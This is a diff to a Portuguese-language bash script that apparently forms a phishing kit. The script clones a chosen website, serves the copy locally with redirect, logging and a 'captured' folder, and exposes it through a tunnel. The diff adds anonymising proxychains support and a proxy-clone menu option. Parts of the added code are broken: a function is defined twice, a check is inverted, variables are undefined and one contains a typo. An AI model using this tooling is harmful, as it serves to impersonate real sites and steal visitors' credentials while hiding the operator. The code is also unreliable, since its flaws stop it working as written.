@@ -56,14 +56,16 @@ clone_site() {
 
     rm -rf "$SITE_DIR"/*
 
-    # curl com proxychains se disponível e configurado
+    # curl com proxychains se disponível e configurado (ou se PROXY_CHAINS_CONF setado)
     local curl_cmd="curl"
-    local curl_opts="-s -L -k --connect-timeout 15 --max-time 30"
-    local proxychains_conf=""
-    if [ -f "$HOME/.proxychains/proxychains.conf" ]; then
-        proxychains_conf="$HOME/.proxychains/proxychains.conf"
-    elif [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ]; then
-        proxychains_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
+    local curl_opts="-s -L -k --connect-timeout 20 --max-time 60"
+    local proxychains_conf="${PROXY_CHAINS_CONF:-}"
+    if [ -z "$proxychains_conf" ]; then
+        if [ -f "$HOME/.proxychains/proxychains.conf" ]; then
+            proxychains_conf="$HOME/.proxychains/proxychains.conf"
+        elif [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ]; then
+            proxychains_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
+        fi
     fi
     if command -v proxychains4 &>/dev/null && [ -n "$proxychains_conf" ]; then
         curl_cmd="proxychains4 -f $proxychains_conf curl"
@@ -96,31 +98,45 @@ clone_site() {
         cat "$SCRIPT_DIR/curl.log" 2>/dev/null
         return 1
     fi
-    echo -e "${GREEN}  → $(wc -c < "$SITE_DIR/index.html") bytes${NC}"
+    local html_size=$(wc -c < "$SITE_DIR/index.html")
+    echo -e "${GREEN}  → ${html_size} bytes${NC}"
+    if [ "$html_size" -lt 5000 ]; then
+        echo -e "${YELLOW}  ⚠ HTML muito pequeno — site pode ser 100% JS (React/Vue).${NC}"
+        echo -e "${YELLOW}    Resultado pode ficar sem estilo ou branco.${NC}"
+    fi
 
     # Extrair domínio base
     local base_domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\1|')
 
-    # 2. Baixar CSS
+    # 2. Baixar CSS — pega todos <link rel="stylesheet"> e também href com .css
     echo -e "${YELLOW}[2/4] Baixando CSS...${NC}"
     local css_count=0
     local css_list_file="$SCRIPT_DIR/.css_list"
-    grep -oE 'href="[^"]*\.css[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//' > "$css_list_file"
+    # Pegar todos os links de CSS (qualquer href que contenha .css)
+    grep -oE 'href="[^"]*\.css[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//' | sort -u > "$css_list_file"
+    # Também pegar <link> com href que NÃO termina em .css mas é CSS (style.min, etc)
+    grep -oE '<link[^>]*href="[^"]*"[^>]*>' "$SITE_DIR/index.html" 2>/dev/null | grep -iE "stylesheet|text/css|content=\"style" | sed -n 's/.*href="\([^"]*\)".*/\1/p' | sort -u >> "$css_list_file"
+    # Duplicatas
+    sort -u "$css_list_file" -o "$css_list_file"
     while IFS= read -r css_url; do
         [ -z "$css_url" ] && continue
-        local css_file="css_${css_count}_$(basename "$css_url" | sed 's/[^a-zA-Z0-9._-]/_/g')"
+        local css_file="css_${css_count}_$(basename "$css_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-50)"
         local css_abs=""
         if echo "$css_url" | grep -q "^http"; then
             css_abs="$css_url"
+        elif echo "$css_url" | grep -q "^//"; then
+            css_abs="https:$css_url"
         elif echo "$css_url" | grep -q "^/"; then
             css_abs="${base_domain}${css_url}"
         else
             css_abs="${base_domain}/${css_url}"
         fi
         $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "$css_abs" >> "$SCRIPT_DIR/curl.log" 2>&1
-        # Trocar no HTML (escapar & e / pro sed)
-        local escaped_url=$(echo "$css_url" | sed 's/[&/\]/\\&/g')
-        sed -i "s|href=\"${escaped_url}\"|href=\"${css_file}\"|g" "$SITE_DIR/index.html"
+        # Trocar no HTML usando perl (literal, sem regex issues)
+        perl -i -pe "s|\Q${css_url}\E|${css_file}|g" "$SITE_DIR/index.html"
+        # Também substituir versão absoluta
+        local abs1="${base_domain}${css_url}";
+        [ "$abs1" != "$css_url" ] && perl -i -pe "s|\Q${abs1}\E|${css_file}|g" "$SITE_DIR/index.html"
         css_count=$((css_count + 1))
     done < "$css_list_file"
     rm -f "$css_list_file"
@@ -163,15 +179,18 @@ clone_site() {
     local domain_plain=$(echo "$base_domain" | sed 's|https\?://||')
     local domain_www="www.${domain_plain}"
 
-    # 3.5 Baixar recursos do CDN (imagens, fonts, webp)
+    # 3.5 Baixar recursos do CDN (imagens, fonts, webp, etc)
     echo -e "${YELLOW}[3.5] Baixando recursos do CDN...${NC}"
     local asset_count=0
-    # Extrair URLs de imagens/assets do HTML e baixar
-    grep -oE '(src|href|url)\s*[=\(]\s*"https://[^"]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^"]*"' "$SITE_DIR/index.html" 2>/dev/null > "$SCRIPT_DIR/.assets_list"
-    # Também do CSS
+    > "$SCRIPT_DIR/.assets_list"
+    # Extrair URLs de imagens/assets do HTML
+    grep -oE '(src|href|url)[^(]*"https?://[^"]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/.*"https/"https/' >> "$SCRIPT_DIR/.assets_list"
+    # Também URLs relativos no HTML (src="//...")
+    grep -oE 'src="//[^"]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's|src="//|https://|' >> "$SCRIPT_DIR/.assets_list"
+    # Do CSS — url('...') e url("...") e url(...)
     for css_file in "$SITE_DIR"/css_*.css; do
         [ -f "$css_file" ] || continue
-        grep -oE 'url\(https://[^)]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^)]*\)' "$css_file" 2>/dev/null | sed 's/url(//;s/).*//' >> "$SCRIPT_DIR/.assets_list"
+        grep -oE 'url\([^)]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^)]*\)' "$css_file" 2>/dev/null | sed 's/url(//;s/).*//;s/["'"'"' ]//g' >> "$SCRIPT_DIR/.assets_list"
     done
     sort -u "$SCRIPT_DIR/.assets_list" > "$SCRIPT_DIR/.assets_list_sorted"
     while IFS= read -r asset_url; do
@@ -707,6 +726,155 @@ stop_all() {
 }
 
 # =============================================
+# PROXY CLONE
+# =============================================
+do_proxy_clone() {
+    clear
+    echo -e "${PURPLE}═══ PROXY CLONE ═══${NC}"
+    echo ""
+    echo -e "${YELLOW}URL do site:${NC} "
+    read URL
+    [ -z "$URL" ] && return
+    echo "$URL" | grep -q "^http" || URL="https://$URL"
+
+    echo -e "${YELLOW}Porta (Enter = 8080):${NC} "
+    read PT
+    [ -z "$PT" ] && PT=8080
+
+    # Ativar proxychains se existir
+    local curl_cmd="curl"
+    local curl_opts="-s -L -k --connect-timeout 20 --max-time 60"
+    local proxychains_conf=""
+
+    if [ -f "$HOME/.proxychains/proxychains.conf" ]; then
+        proxychains_conf="$HOME/.proxychains/proxychains.conf"
+    elif [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ]; then
+        proxychains_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
+    fi
+
+    [ -n "$proxychains_conf" ] && echo -e "${RED}[proxychains] Arquivo NÃO encontrado!${NC}" && pause && return
+
+    local base_url="$MINHA_URL"
+    local porta="$PT"
+
+    # Baixar HTML via proxychains
+    sleep 2
+    $curl_cmd $curl_opts -o /tmp/proxy_index.html "$base_url" > /dev/null 2>&1
+
+    if [ ! -s /tmp/proxy_index.html ]; then
+        echo -e "${RED}[ERRO] Falha ao baixar via proxy.${NC}"
+        read
+        return
+    fi
+    echo -e "${GREEN}  → HTML OK ($(wc -c < /tmp/proxy_index.html) bytes)${NC}"
+
+    # Baixar CSS via proxy + substituir no HTML
+    local css_count=0
+    grep -oE 'href="[^"]*\.css[^"]*"' /tmp/proxy_index.html 2>/dev/null | sed 's/href="//;s/"//' | while read -r css_url; do
+        [ -z "$css_url" ] && continue
+        if echo "$css_url" | grep -q "^http"; then
+        local css_abs="$css_url"
+        else
+            local css_abs="$$base_url/$css_url"
+        fi
+        local css_file="css_${css_count}_$(basename "$css_url" | sed 's/[^a-zA-Z0-9._-]/_/g')"
+        $curl_cmd $curl_opts -o "/tmp/$css_file" "$css_abs" >> /dev/null 2>&1
+        css_count=$((css_count + 1))
+    done
+    echo -e "${GREEN}  → CSS baixado(s)${NC}"
+
+    # Pegar IP
+    local my_ip=$(get_my_ip)
+
+    # Substituir URLs do site pelo proxy
+    local local_url="http://${my_ip}:${porta}"
+    perl -i -pe "s|\Q${base_url}\E|${local_url}|g" /tmp/proxy_index.html
+
+    # ... (resto do processamento simplificado)
+    # Mover pra pasta clonada
+    rm -rf "$SITE_DIR"/*
+    cp /tmp/proxy_index.html "$SITE_DIR/index.html"
+    [ -d "$SCRIPT_DIR/captured" ] || mkdir -p "$SITE_DIR/../captured"
+    $do_proxy_clean_tmp && echo -e "  ✔ Limpeza temporária"
+
+    echo ""
+    echo -e "  ✅ CLONE PROXY REALIZADO!"
+    echo -e "  📍 http://${my_ip}:${porta}"
+
+    # Matar processo antigo
+    pkill -9 -f "node.*server.js" 2>/dev/null
+    sleep 1
+    fuser -k "$port/tcp" 2>/dev/null
+
+    # Iniciar server
+    cd "$SCRIPT_DIR"
+    REDIRECT_URL="$base_url" PORT="$porta" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node server/server.js > server.log 2>&1 &
+    local pid=$!
+    echo "$pid" > "$SCRIPT_DIR/.server.pid"
+    sleep 2
+
+    if kill -0 "$pid" 2>/dev/null; then
+        echo -e "${GREEN}[✓] Servidor rodando! PID: $pid${NC}"
+    else
+        echo -e "${RED}[ERRO] Servidor não subiu. Log:${NC}"
+        cat "$SCRIPT_DIR/server.log" 2>/dev/null
+    fi
+
+    rm -f /tmp/proxy_index.html /tmp/css_*.css
+    echo ""
+    echo -e "${YELLOW}Pressione Enter...${NC}"
+    read
+}
+
+# =============================================
+# PROXY CLONE
+# =============================================
+do_proxy_clone() {
+    clear
+    echo -e "\033[1;36m═══ PROXY CLONE ═══\033[0m"
+    echo ""
+
+    # Verificar proxychains
+    local proxychains_conf=""
+    if [ -f "$HOME/.proxychains/proxychains.conf" ]; then
+        proxychains_conf="$HOME/.proxychains/proxychains.conf"
+    elif [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ]; then
+        proxychains_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
+    fi
+
+    if [ -z "$proxychains_conf" ] || ! command -v proxychains4 &>/dev/null; then
+        echo -e "${RED}  proxychains4 não encontrado ou sem config!${NC}"
+        echo -e "${YELLOW}  Instale: pkg install proxychains-ng${NC}"
+        echo -e "${YELLOW}  Configure: ~/.proxychains/proxychains.conf${NC}"
+        echo ""
+        echo -e "${YELLOW}Enter...${NC}"
+        read
+        return
+    fi
+
+    echo -e "${GREEN}  ✓ ProxyChains ATIVO → $proxychains_conf${NC}"
+    echo ""
+    echo -e "${YELLOW}URL do site:${NC} "
+    read URL
+    [ -z "$URL" ] && return
+    echo "$URL" | grep -q "^http" || URL="https://$URL"
+
+    echo -e "${YELLOW}Redirect (Enter = mesma):${NC} "
+    read REDIR
+    [ -z "$REDIR" ] && REDIR="$URL"
+    echo "$REDIR" | grep -q "^http" || REDIR="https://$REDIR"
+
+    echo -e "${YELLOW}Porta (Enter = 8080):${NC} "
+    read PT
+    [ -z "$PT" ] && PT=8080
+
+    # Exportar proxychains pra clone_site usar
+    export PROXY_CHAINS_CONF="$proxychains_conf"
+    clone_site "$URL" "$REDIR" "$PT"
+    unset PROXY_CHAINS_CONF
+}
+
+# =============================================
 # MENU
 # =============================================
 while true; do
@@ -730,6 +898,11 @@ while true; do
     echo -e "  🔗 6) LINK      - Ver link do túnel ativo"
     echo -e "  📊 7) STATUS    - Ver tudo do sistema"
     echo -e "  🛑 8) PARAR     - Desligar tudo"
+    if [ -n "$proxychains_conf" ]; then
+        echo -e "${GREEN}  🔓 9) PROXY     - Clonar com proxychains (ATIVO)${NC}"
+    else
+        echo -e "  🔒 9) PROXY     - Clonar com proxychains"
+    fi
     echo ""
     echo -e "  ❌ 0) SAIR"
     echo ""
@@ -780,6 +953,9 @@ while true; do
             echo ""
             echo -e "${YELLOW}Enter...${NC}"
             read
+            ;;
+        9)
+            do_proxy_clone
             ;;
         0)
             stop_all
